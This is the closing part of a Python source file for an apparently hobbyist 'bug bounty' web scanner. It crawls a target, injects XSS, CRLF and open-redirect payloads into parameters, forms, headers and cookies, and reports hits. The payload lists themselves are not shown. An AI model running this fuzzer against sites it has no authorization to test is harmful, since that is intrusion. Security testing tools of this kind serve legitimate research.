            "\n".join(f"  [cyan]{s}[/cyan] → [dim]{', '.join(ips)}[/dim]" for s, ips in subs),
            title=f"SUBDOMAINS ({len(subs)} found)", border_style="cyan"
        ))
    special = [f for f in recon_findings if f[0] in (
        "CLICKJACKING", "CORS-CRITICAL", "CORS-MEDIUM", "SENSITIVE-FILE", "DIR-LISTING"
    )]
    if special:
        console.print(Panel(
            f"[bold yellow]⚠ {len(special)} important findings[/bold yellow]",
            title="RECON FINDINGS", border_style="yellow"
        ))
        for typ, item, desc, _ in special:
            console.print(f"  [yellow][!] {typ:<20}[/yellow] {item[:60]} — [dim]{desc[:40]}[/dim]")
    header_issues = [f for f in recon_findings if f[0] == "HEADER-MISSING"]
    if header_issues:
        console.print(f"\n[bold yellow]  Missing headers ({len(header_issues)}):[/bold yellow]")
        for _, hdr, desc, _ in header_issues:
            console.print(f"  [yellow]✗ {hdr:<35}[/yellow] [dim]{desc}[/dim]")
    if all_findings:
        by_type = {}
        for f in all_findings:
            by_type.setdefault(f[0], []).append(f)
        for typ, items in by_type.items():
            color = "green" if typ == "XSS" else "red" if typ == "REDIRECT" else "magenta"
            deduped = list({u: (t, s, u, p, pl) for t, s, u, p, pl in items}.values())[:10]
            console.print(Panel(
                f"[bold {color}]🎯 {len(deduped)} {typ} findings[/bold {color}]",
                title=f"{typ} FINDINGS", border_style=color
            ))
            for idx, (t, src, url, param, pl) in enumerate(deduped, 1):
                console.print(
                    f"  [bold yellow][{idx}][/bold yellow] [dim]{src}[/dim] param=[cyan]{param}[/cyan]\n"
                    f"      [white]{url[:100]}[/white]"
                )
    else:
        console.print(Panel("[bold red]❌ No active vulnerabilities detected.[/bold red]",
                            title="ACTIVE SCAN", border_style="red"))
    console.print(f"\n[dim]Duration: {elapsed_total:.1f}s  |  Speed: {completed/elapsed_total:.1f} req/s[/dim]")
def run_scan(target):
    stop_event.clear()
    console.print(f"\n[bold blue][*] Target: {target}[/bold blue]")
    init_session = requests.Session()
    init_session.headers.update(HEADERS)
    base_url = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
    console.print("[dim]  → Getting baseline fingerprint...[/dim]")
    fingerprints = get_baseline_fingerprint(init_session, base_url)
    console.print(
        f"[dim]  → 404 baseline: status={fingerprints['404_status']} "
        f"len={fingerprints['404_len']} | home_len={fingerprints['home_len']}[/dim]"
    )
    recon_findings, extra = run_recon(target, init_session, fingerprints)
    console.print(f"\n[bold cyan][*] Starting crawler (max {MAX_CRAWL_PAGES} pages)...[/bold cyan]")
    try:
        pages = crawl_links(target, init_session)
    except Exception as e:
        console.print(f"[bold red][!] Unreachable: {e}[/bold red]")
        return
    console.print(f"[dim]  → {len(pages)} pages found[/dim]")
    xss_tasks = []
    crlf_tasks = []
    redirect_tasks = []
    for page_url, page_html, soup, _ in pages:
        parsed_url   = urlparse(page_url)
        query_params = parse_qs(parsed_url.query)
        for param in query_params:
            for pl in PAYLOADS:
                xss_tasks.append(("XSS", page_url, "GET", param, pl, "URL-PARAM"))
        for form in soup.find_all("form"):
            action   = form.attrs.get("action", "")
            post_url = urljoin(page_url, action)
            method   = form.attrs.get("method", "get").upper()
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.attrs.get("name")
                typ  = inp.attrs.get("type", "text")
                if name and (inp.name in ["textarea", "select"] or
                             typ in ["text", "search", "hidden", "email", "url", "number", "tel"]):
                    for pl in PAYLOADS:
                        xss_tasks.append(("XSS", post_url, method, name, pl, "FORM"))
        for t in extract_js_params(page_html, page_url):
            xss_tasks.append(("XSS", t[0], t[1], t[2], t[3], t[4]))
        for param in query_params:
            for pl in CRLF_PAYLOADS:
                crlf_tasks.append(("CRLF", page_url, "GET", param, pl, "CRLF"))
        all_params = set(query_params.keys()) | set(REDIRECT_PARAMS)
        for param in all_params:
            for pl in REDIRECT_PAYLOADS_SAFE:
                redirect_tasks.append(("REDIRECT", page_url, "GET", param, pl, "REDIRECT"))
        for param in all_params:
            for pl in REDIRECT_PAYLOADS_EVIL:
                redirect_tasks.append(("REDIRECT", page_url, "GET", param, pl, "REDIRECT"))
    for h in ["Referer", "X-Forwarded-For", "X-Original-URL", "User-Agent", "Origin"]:
        for pl in PAYLOADS[:15]:
            xss_tasks.append(("XSS", target, "HEADER", h, pl, "HEADER"))
    try:
        r = init_session.get(target, timeout=REQUEST_TIMEOUT)
        for cookie in r.cookies:
            for pl in PAYLOADS[:15]:
                xss_tasks.append(("XSS", target, "COOKIE", cookie.name, pl, "COOKIE"))
    except Exception:
        pass
    tasks = xss_tasks + crlf_tasks + redirect_tasks
    source_counts = {}
    for t in tasks:
        source_counts[t[5]] = source_counts.get(t[5], 0) + 1
    console.print(f"\n[bold green][+] Total {len(tasks)} active tests:[/bold green]")
    for src, cnt in sorted(source_counts.items(), key=lambda x: -x[1]):
        console.print(f"    [dim]{src:<12} → {cnt}[/dim]")
    console.print(f"\n[bold magenta][*] Fuzzing started ({MAX_WORKERS} workers) — press 't' + Enter to stop...[/bold magenta]\n")
    all_findings = []
    completed    = 0
    start_time   = time.time()
    kb_thread = threading.Thread(target=keyboard_listener, daemon=True)
    kb_thread.start()
    def dispatch(task):
        typ = task[0]
        if typ == "XSS":
            _, url, method, param, payload, source = task
            return test_xss(url, method, param, payload, source)
        elif typ == "REDIRECT":
            _, url, method, param, payload, source = task
            return test_redirect(url, param, payload)
        elif typ == "CRLF":
            _, url, method, param, payload, source = task
            return test_crlf(url, param, payload)
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_map = {executor.submit(dispatch, t): t for t in tasks}
        for future in concurrent.futures.as_completed(future_map):
            if stop_event.is_set():
                console.print("\n[bold yellow][!] Stopped — showing current results...[/bold yellow]")
                executor.shutdown(wait=False, cancel_futures=True)
                break
            result = future.result()
            completed += 1
            if not result:
                continue
            typ, method, param, short_pl, status, vuln_url, source = result
            if vuln_url:
                all_findings.append((typ, source, vuln_url, param, short_pl))
            if status in ("CRITICAL", "BLOCKED") or completed % PRINT_EVERY == 0:
                style   = STATUS_STYLE.get(status, status)
                elapsed = time.time() - start_time
                rps     = completed / elapsed if elapsed > 0 else 0
                pct     = completed / len(tasks) * 100
                console.print(
                    f"[dim]{completed:>6}/{len(tasks)} {pct:4.0f}% {rps:5.1f}r/s[/dim] "
                    f"[bold cyan]{typ:<8}[/bold cyan][cyan]{method:<7}[/cyan]"
                    f"[dim]{source:<10}[/dim][magenta]{param:<15}[/magenta] "
                    f"{style} [dim]{short_pl}[/dim]"
                )
    stop_event.set()
    elapsed_total = time.time() - start_time
    print_report(recon_findings, extra, all_findings, completed, len(tasks), elapsed_total)
    save_report(target, recon_findings, extra, all_findings, completed, len(tasks), elapsed_total, len(pages), source_counts)
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = """
[bold cyan]███╗   ██╗ ██████╗ ██╗    ██╗███████╗██╗   ██╗██╗  ██╗
████╗  ██║██╔═══██╗██║    ██║╚══███╔╝╚██╗ ██╔╝╚██╗██╔╝
██╔██╗ ██║██║   ██║██║ █╗ ██║  ███╔╝  ╚████╔╝  ╚███╔╝
██║╚██╗██║██║   ██║██║███╗██║ ███╔╝    ╚██╔╝   ██╔██╗
██║ ╚████║╚██████╔╝╚███╔███╔╝███████╗   ██║   ██╔╝ ██╗
╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝[/bold cyan]
         [bold white]>> BUG BOUNTY SCANNER v7.0 — N0wzy8 <<[/bold white]
  [bold red][ XSS · REDIRECT · CRLF · CORS · CLICKJACKING · RECON ][/bold red]
"""
    console.print(banner)
    console.print(f"[dim]Workers: {MAX_WORKERS}  |  XSS: {len(PAYLOADS)}  |  Redirect: {len(REDIRECT_PAYLOADS)}  |  CRLF: {len(CRLF_PAYLOADS)}  |  Paths: {len(SENSITIVE_PATHS)}[/dim]")
    console.print("[dim]'q' = quit  |  't' + Enter = stop[/dim]\n")
    while True:
        try:
            target = console.input("\n[bold yellow][?] Target URL or Domain: [/bold yellow]").strip()
        except (KeyboardInterrupt, EOFError):
            console.print("\n[bold red]Exiting...[/bold red]")
            break
        if target.lower() in ("q", "exit", "quit"):
            console.print("[bold red]Exiting...[/bold red]")
            break
        if not target:
            continue
        if not target.startswith("http"):
            target = "https://" + target
        run_scan(target)
        console.print("\n[dim]─── Scan complete. You can enter a new target. ───[/dim]")
if __name__ == "__main__":
    main()